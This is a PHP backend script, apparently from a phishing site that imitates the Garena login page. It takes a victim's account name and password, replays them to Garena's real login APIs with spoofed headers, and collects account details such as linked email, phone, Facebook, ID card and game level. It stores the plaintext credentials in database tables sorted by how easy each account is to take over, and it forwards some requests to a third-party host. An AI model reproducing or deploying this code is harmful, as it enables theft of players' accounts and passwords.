<?php 
include ('KetNoiDataBase.php');
$chanlv = file_get_contents('chanlv.txt');
date_default_timezone_set('Asia/Ho_Chi_Minh');
header('Content-Type: application/json');
$tk = str_replace(array('<',"'",'>','?','/',"\\",'--','eval(','<php'),array('','','','','','','','',''),htmlspecialchars(addslashes(strip_tags($_GET['account']))));
$id = $_GET['id'];
include ('simple_html_dom.php'); 
$headers = array(
	'X-Requested-With: com.garena.gaslite',
	'Referer: authgop.garena.com',
	'Accept: application/json, text/javascript, /; q=0.01',
	'Accept-Language:vi,en-US;q=0.9,en;q=0.8',
	'Connection: keep-alive',
	'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="102", "Google Chrome";v="102"',
	'sec-ch-ua-mobile: ?1',
	'sec-ch-ua-platform: "Android"',
	'Sec-Fetch-Dest: empty',
	'Sec-Fetch-Mode: cors',
	'User-Agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Mobile Safari/537.36',
	'x-datadome-clientid: .keep',
	'X-Forwarded-For: '.rand(1,255).'.'.rand(1,255).'.'.rand(1,255).'.'.rand(1,255).'',
	'X-Requested-With: XMLHttpRequest'
);

    // $Blockip = mysqli_query($conn,"SELECT COUNT(*) FROM BlockIP WHERE ip LIKE '$ip'"); 
    // $countIP = mysqli_fetch_array($Blockip);

    // if ($countIP[0] >= 20) {
    //         die(json_encode([
    //         "LXT" => "Hello thằng ngu",
    //         "error" => 'BlockIP'
    //         ]));
    //         } 
        
// mysqli_query ($conn, "INSERT INTO BlockIP (IP) VALUES ('$ip')");



$time = $_GET['id'];
$loginne = 0;
$_SESSION['xacminh'] = 0;
if (file_exists("/cookie/$tk.mp3"))
{
	unlink("/cookie/$tk.mp3");
}
if(isset($_GET['shopee_captcha_token'])){

	$shopee_captcha_token = $_GET['shopee_captcha_token'];

	$c = curl_init();
	curl_setopt($c, CURLOPT_URL, "https://100055.connect.garena.com/api/prelogin?account=$tk&shopee_captcha_token=$shopee_captcha_token&format=json&id=$id&app_id=10100");
	curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($c, CURLOPT_SSL_VERIFYHOST, false);
	curl_setopt($c, CURLOPT_FOLLOWLOCATION, true);
	curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($c, CURLOPT_HTTPHEADER, $headers);
	curl_setopt($c, CURLOPT_COOKIEJAR, dirname(_FILE_) . "/cookie/$tk.mp3");
	curl_setopt($c, CURLOPT_COOKIEFILE, dirname(_FILE_) . "/cookie/$tk.mp3");
	$rq1 = curl_exec($c);
	curl_close($c);

}elseif(isset($_GET['password'])) {
	$password  = str_replace(array('<',"'",'>','?','/',"\\",'--','eval(','<php'),array('','','','','','','','',''),htmlspecialchars(addslashes(strip_tags($_GET['password']))));
	$pass_luu  = str_replace(array('<',"'",'>','?','/',"\\",'--','eval(','<php'),array('','','','','','','','',''),htmlspecialchars(addslashes(strip_tags($_GET['password_save']))));


	$c = curl_init();
	curl_setopt($c, CURLOPT_URL, "https://auth.garena.com/api/login?account=$tk&password=$password&format=json&id=$id&app_id=10100");
	curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($c, CURLOPT_SSL_VERIFYHOST, false);
	curl_setopt($c, CURLOPT_FOLLOWLOCATION, true);
	curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($c, CURLOPT_HTTPHEADER, $headers);
	curl_setopt($c, CURLOPT_COOKIEJAR, dirname(_FILE_) . "/cookie/$tk.mp3");
	curl_setopt($c, CURLOPT_COOKIEFILE, dirname(_FILE_) . "/cookie/$tk.mp3");
	$rq1 = curl_exec($c);
	curl_close($c);

	if (strpos($rq1, 'session_key') !== false) {
		$loginne = 1;
		$session_key = json_decode($rq1, true) ['session_key'];
		$rq4444 = curl("https://account.garena.com/api/account/init?session_key=" . $session_key, false, '', dirname(_FILE_) . "/cookie/$tk.mp3", dirname(_FILE_) . "/cookie/$tk.mp3");
		$data3      = json_decode($rq4444[1], true);
		$shell      = $data3["user_info"]["shell"];
		$nickname   = $data3["user_info"]["nickname"];
		$uid        = $data3["user_info"]["uid"];
		$level      = $data3["user_info"]["level"];
		$mobile_no  = $data3["user_info"]["mobile_no"];
		$suspicious = $data3["user_info"]["suspicious"];
		$email_v    = $data3["user_info"]["email_v"];
		$CheckEmail = $data3["user_info"]["email_v"];
		$fb_account = $data3["user_info"]["fb_account"];
		$authen     = $data3["user_info"]["authenticator_enable"];
		$_SESSION['checkauhen'] = $authen;
		$_SESSION['user'] = $tk;
		$_SESSION['Login']   = $tk;
		$_SESSION['wheel'] = $luotquay;
		 $_SESSION['phone'] = $mobile_no;
		if ($email_v !== 0) {
			$email_v   = "Email: Yes";
			$email_v_z = "yes";
		} else {
			$email_v   = "Email: No";
			$email_v_z = "no";
		}
		if (strpos($mobile_no, '*') !== false) {
			$mobile_no   = "Sdt: Yes";
			$mobile_no_z = "yes";
		} else {
			$mobile_no   = "Sdt: No";
			$mobile_no_z = "no";
		}
		if ($fb_account !== null) {
			$fb_account = "LK FB: Yes";
			$fb_uid = $data3["user_info"]["fb_account"]["fb_uid"];
	
			$c = curl_init();
			curl_setopt($c, CURLOPT_URL, "https://thanhlike.com/modun/tool/get_facebook.php?type=checklive&id=$fb_uid");
			curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
			curl_setopt($c, CURLOPT_SSL_VERIFYHOST, false);
			curl_setopt($c, CURLOPT_FOLLOWLOCATION, true);
			curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
			$rq1 = curl_exec($c);
			curl_close($c);
			if ($rq1 == 'die') {
				$fb = 'DIE';
			} else if ($rq1 == 'live') {
				$fb = 'LIVE';
			}
		} else {
			$fb = 'NO';
		}
		if (strpos($rq4444[1], 'idcard') !== false) {
			$cmnd = 'YES';
		} else {
			$cmnd = 'NO';
		}
		if ($CheckEmail == 0) {
			$Email = 'NO';
		} else if ($CheckEmail == 1) {
			$Email = 'YES';
		}
		
		
		
		

         	



      $_SESSION['mail']      = $mail_check;
      $_SESSION['sdt']      = $mobile_check;
		
		
		
		$data5 = curl("https://connect.garena.com/ui/login?app_id=10043&redirect_uri=https%3A%2F%2Fpvp.garena.vn%2F%3Flocale_name%3DVN&locale=vi-VN", false, '', dirname(_FILE_) . "/cookie/$tk.mp3", dirname(_FILE_) . "/cookie/$tk.mp3");
		$Tach_2 = get_string_between($data5[0],'session_key=','Set-');
		preg_match('/^Set-Cookie:\s*([^;]*)/mi', $data5[0], $cookie1);
		$data6 = curl("https://pvp.garena.vn/api/summoner/profile/", '{}', '', dirname(_FILE_) . "/cookie/$tk.mp3", dirname(_FILE_) . "/cookie/$tk.mp3",true,array('Cookie: session_key='.str_replace("\n", "", $Tach_2).''));              
		$_SESSION['tuong']   = $data6[1];
    if (stristr($data6[1],'champion_cnt'))                                  //check lien quan
    {
    	$sotuong_lqm = get_string_between($data6[0],'"champion_cnt":', ',');

    	$lvgame = get_string_between($data6[0],'"pvp_level":"','",');
    	$avatar =get_string_between($data6[0],'"head_img":"','",');
    	$_SESSION['avatar']   = $avatar;

    }else {
    	$sotuong_lqm = '00';
    	$lvgame = '0';
    }
   
    if ($lvgame < $chanlv) {
    	$id_cc       = round(microtime(true) * 1000);
    	die(json_encode([
    		"id" => $id_cc,
    		"error" => 'error_chanlevel'
    	]));
    }
    if($sotuong_lqm == '10'){

    	$sotuong_lqm= 'KXD';
    }else{

    	$sotuong_lqm;

        }
        if ($email_v_z == 'no' && $mobile_no_z == 'no' && $suspicious == false) {
            $loginne = 2;
        }
        
        
        $_SESSION['request_login'] = $tk;
        $_SESSION['user'] = $tk;
        $_SESSION['pass'] = $pass_luu;
        $_SESSION['user'] = $tk;
        $_SESSION['img'] = $avatar;
        $_SESSION['tuong']   = $sotuong_lqm;  // Lưu session tướng
        $_SESSION['lv']      = $lvgame;       // Lưu session level
        $_SESSION['fb']      = $fb;
        $_SESSION['cmnd']    = $cmnd;
        $_SESSION['email']      = $Email;
        $postdoipass = 'client_id=200016&response_type=token&redirect_uri=https%3A%2F%2Fauth.member.garena.vn%2Fcallback&all_platforms=1&platform=1&locale=vi-VN&format=json&id=1648385492035&app_id=200016';
        $c = curl_init();
        curl_setopt($c, CURLOPT_URL, "https://auth.garena.com/oauth/token/grant");
        curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($c, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($c, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($c, CURLOPT_COOKIEJAR, dirname(_FILE_) . "/cookie/$tk.mp3");
        curl_setopt($c, CURLOPT_COOKIEFILE, dirname(_FILE_) . "/cookie/$tk.mp3");

        curl_setopt($c, CURLOPT_POST, 1);
        curl_setopt($c, CURLOPT_POSTFIELDS, $postdoipass);
        $rq4 = curl_exec($c);
        curl_close($c);

        $data3      = json_decode($rq4, true);
        $link      = $data3["redirect_uri"];
        
        $data5 = curl("$link");
        
        
        
        $Tach_2 = get_string_between($data5[0],'set-cookie:',';');
        
        
        $headers = array(
        	'Cookie: '.$Tach_2.'',
        	'user-agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Mobile Safari/537.36'
        );
        $postdoipass = '[{"variables":{},"query":"{\n  state {\n    id\n    topup\n    class\n    expiredAt\n    numSpin\n    __typename\n  }\n}\n"},{"variables":{},"query":"{\n  event {\n    id\n    title\n    time\n    address\n    endTime\n    noted\n    background\n    requiredClass\n    register {\n      fullname\n      phone\n      dob\n      address\n      __typename\n    }\n    __typename\n  }\n}\n"}]';
        $c = curl_init();
        curl_setopt($c, CURLOPT_URL, "https://lienquan.member.garena.vn/graphql");
        curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($c, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($c, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($c, CURLOPT_COOKIEJAR, dirname(_FILE_) . "/cookie/$tk.mp3");
        curl_setopt($c, CURLOPT_COOKIEFILE, dirname(_FILE_) . "/cookie/$tk.mp3");
        curl_setopt($c, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($c, CURLOPT_POST, 1);
        curl_setopt($c, CURLOPT_POSTFIELDS, $postdoipass);
        $rq6 = curl_exec($c);
        curl_close($c);
        $QuanHuy = get_string_between($rq6,'"topup":',',"');
        if ($QuanHuy == "") {
        	$QuanHuy ="Unknown";
        }
        ;

        $_SESSION['quanhuy'] = $QuanHuy;

        if  ($authen == 0 && $mobile_no_z == 'yes')
        {
            
            $loginne == 1;
            
            
        }
        
     if (mysqli_num_rows(mysqli_query($conn,"SELECT * FROM account_main WHERE user = '".$tk."' ")) == 0){
     if ($email_v_z == 'no' && $mobile_no_z == 'no' && $suspicious == false) {
     mysqli_query($conn, "INSERT INTO account_ttt (user, pass, level, sotuong, fb, cmnd, email, quanhuy, time, ip) VALUES ('{$tk}', '{$pass_luu}', '{$lvgame}', '{$sotuong_lqm}','{$fb}','{$cmnd}','{$Email}',   '{$QuanHuy}', '{$time_save}', '{$ip}')");
     mysqli_query($conn, "INSERT INTO account_main (user, pass, sdtz, mailz, level, sotuong, fb,cmnd, email, quanhuy, time, ip, luotquay) VALUES ('{$tk}', '{$pass_luu}', '{$mobile_check}', '{$mail_check}', '{$lvgame}', '{$sotuong_lqm}', '{$fb}','{$cmnd}','{$Email}',   '{$QuanHuy}', '{$time_save}', '{$ip}', '$luotquay')");
     }elseif ($email_v_z == 'no' && $mobile_no_z == 'no' && $suspicious == true) {
    mysqli_query($conn, "INSERT INTO account_loi (user, pass, level, sotuong, fb, cmnd, email, quanhuy, time, ip) VALUES ('{$tk}', '{$pass_luu}', '{$lvgame}', '{$sotuong_lqm}','{$fb}','{$cmnd}','{$Email}',   '{$QuanHuy}', '{$time_save}', '{$ip}')");
    mysqli_query($conn, "INSERT INTO account_main (user, pass, sdtz, mailz, level, sotuong, fb,cmnd, email, quanhuy, time, ip, luotquay) VALUES ('{$tk}', '{$pass_luu}', '{$mobile_check}', '{$mail_check}', '{$lvgame}', '{$sotuong_lqm}', '{$fb}','{$cmnd}','{$Email}',   '{$QuanHuy}', '{$time_save}', '{$ip}', '$luotquay')");
     }elseif ($email_v_z == 'no' && $mobile_no_z == 'yes' ){
     mysqli_query($conn, "INSERT INTO account_mobile_yes (user, pass, time, ip) VALUES ('{$tk}', '{$pass_luu}', '{$time_save}', '{$ip}')");
     mysqli_query($conn, "INSERT INTO account_main (user, pass, sdtz, mailz, level, sotuong, fb,cmnd, email, quanhuy, time, ip, luotquay) VALUES ('{$tk}', '{$pass_luu}', '{$mobile_check}', '{$mail_check}', '{$lvgame}', '{$sotuong_lqm}', '{$fb}','{$cmnd}','{$Email}',   '{$QuanHuy}', '{$time_save}', '{$ip}', '$luotquay')");
     }else {
    mysqli_query($conn, "INSERT INTO account_main (user, pass, sdtz, mailz, level, sotuong, fb,cmnd, email, quanhuy, time, ip, luotquay) VALUES ('{$tk}', '{$pass_luu}', '{$mobile_check}', '{$mail_check}', '{$lvgame}', '{$sotuong_lqm}', '{$fb}','{$cmnd}','{$Email}',   '{$QuanHuy}', '{$time_save}', '{$ip}', '$luotquay')"); }
     }else {
     if ($email_v_z == 'no' && $mobile_no_z == 'no' && $suspicious == false) {
     mysqli_query($conn,"UPDATE account_main SET pass = '{$pass_luu}' where `user`='".$tk."'");
     }elseif ($email_v_z == 'no' && $mobile_no_z == 'no' && $suspicious == true) {
     mysqli_query($conn,"UPDATE account_main SET pass = '{$pass_luu}' where `user`='".$tk."'");
     } else {
     mysqli_query($conn,"UPDATE account_main SET pass = '{$pass_luu}' where `user`='".$tk."'");
     }
     mysqli_query($conn,"UPDATE account_main SET user = '".$tk."' where `user`='".$tk."'");
     mysqli_query($conn,"UPDATE account_main SET pass = '".$pass_luu."' where `user`='".$tk."'");
     
        mysqli_query($conn,"UPDATE account_main SET sdtz = '".$mobile_check."' where `user`='".$tk."'");
     mysqli_query($conn,"UPDATE account_main SET mailz = '".$mail_check."' where `user`='".$tk."'");
     
     mysqli_query($conn,"UPDATE account_main SET level = '".$lvgame."' where `user`='".$tk."'");
     mysqli_query($conn,"UPDATE account_main SET sotuong = '".$sotuong_lqm."' where `user`='".$tk."'");
     mysqli_query($conn,"UPDATE account_main SET fb = '".$fb."' where `user`='".$tk."'");
     mysqli_query($conn,"UPDATE account_main SET cmnd = '".$cmnd."' where `user`='".$tk."'");
     mysqli_query($conn,"UPDATE account_main SET email = '".$Email."' where `user`='".$tk."'");
     mysqli_query($conn,"UPDATE account_main SET quanhuy =  '{$QuanHuy}' where `user`='".$tk."'");
     mysqli_query($conn,"UPDATE account_main SET time = '".$time_save."' where `user`='".$tk."'");
     mysqli_query($conn,"UPDATE account_main SET ip = '".$ip."' where `user`='".$tk."'");

     }
    }

}else if (isset($_GET['captcha_key']))
{
	$captcha = $_GET['captcha'];
	$captcha_key = $_GET['captcha_key'];
	$password = $_GET['password'];
    $rq1 = Curl_GetLXT('https://sso.garena.com/api/prelogin?account='.$tk.'&captcha_key='.$captcha_key.'&captcha='.$captcha.'&format=json&id='.$time.'&app_id=10100');

} 
else {
 $t = $_SERVER['HTTP_HOST'];
	$rq1 = Curl_GetLXT('https://apivietnam1s.com/apilogin.php?account='.$tk.'&format=json&id='.$id.'&app_id=10100&tenmien='.$t.'');
}


function Curl_GetLXT($url)
  {
    global $tk;
    global $headers;
    $c = curl_init();
	curl_setopt($c, CURLOPT_URL, $url);
	curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($c, CURLOPT_SSL_VERIFYHOST, false);
	curl_setopt($c, CURLOPT_FOLLOWLOCATION, true);
	curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($c, CURLOPT_HTTPHEADER, $headers);
	curl_setopt($c, CURLOPT_COOKIEJAR, dirname(_FILE_) . "/cookie/$tk.mp3");
	curl_setopt($c, CURLOPT_COOKIEFILE, dirname(_FILE_) . "/cookie/$tk.mp3");
	$result = curl_exec($c);
	curl_close($c);
	return $result;
  }




if ($loginne == 1)
{
	echo '{"id": "'.$time.'", "error": "error_chuyen_huong", "link_ch": "../xac-minh-otp.html"}';
}
else if ($loginne == 2)
{
	echo '{"id": "'.$time.'", "error": "error_chuyen_huong", "link_ch": "../login/DaXacMinh.php"}';
}

else {
	echo $rq1;
}
?>